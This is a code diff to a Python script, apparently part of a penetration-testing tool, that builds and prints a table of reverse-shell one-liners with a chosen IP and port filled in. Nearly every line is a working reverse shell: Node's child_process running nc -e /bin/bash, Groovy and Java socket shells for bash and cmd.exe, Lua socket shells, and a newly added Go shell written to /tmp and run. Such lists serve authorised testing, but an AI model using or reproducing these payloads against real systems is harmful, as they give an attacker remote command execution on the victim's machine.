@@ -375,20 +375,28 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
 ║ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/xxx/yyy;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
-╚═══════════════════════════════════════════════════
-╔JAVA for GROOVY════════════════════════════════════"""
+╚═══════════════════════════════════════════════════"""
         )
     if not pwncat:
         shells.append(windows_color)
+    shells.append(
+        r"""
+
+╔JAVA for GROOVY════════════════════════════════════"""
+    )
+    if not pwncat:
         shells.append(
             r"""
 ║ String host="xxx";
 int port=yyy;
 String cmd="cmd.exe";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-╠═══════════════════════════════════════════════════"""
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"""
         )
     if not rlwrap:
+        shells.append(
+            r"""
+╠═══════════════════════════════════════════════════"""
+        )
         shells.append(linux_color)
         shells.append(
             r"""
@@ -396,7 +404,16 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 int port=yyy;
 String cmd="/bin/bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-╚═══════════════════════════════════════════════════
+╚═══════════════════════════════════════════════════"""
+        )
+    else:
+        shells.append(
+            r"""
+╚═══════════════════════════════════════════════════"""
+        )
+    if not rlwrap:
+        shells.append(
+            r"""
 
 ╔LUA═════════╦══════════════════════════════════════
 ║ Linux only ║ lua -e "require('socket');require('os');t=socket.tcp();t:connect('xxx','yyy');os.execute('/bin/sh -i <&3 >&3 2>&3');" """
@@ -408,12 +425,25 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ╠════════════╩══════╦═══════════════════════════════"""
         )
     else:
-        shells.append(r"""╔LUA═════════╦══════════════════════════════════════""")
+        shells.append(
+            r"""
+
+╔LUA═════════╦══════════════════════════════════════"""
+        )
     shells.append(
         r"""
 ║ Windows and Linux ║ lua5.1 -e 'local host, port = "xxx", yyy local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ╚═══════════════════╩═══════════════════════════════"""
     )
+    if not rlwrap:
+        shells.append(linux_color)
+        shells.append(
+            r"""
+
+╔GOLANG══════╦══════════════════════════════════════
+║ Linux only ║ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","xxx:yyy");m:=exec.Command("/bin/sh");m.Stdin=c;m.Stdout=c;m.Stderr=c;m.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+╚════════════╩══════════════════════════════════════"""
+        )
 
     print("".join(shells).replace("xxx", ipp).replace("yyy", port))
 
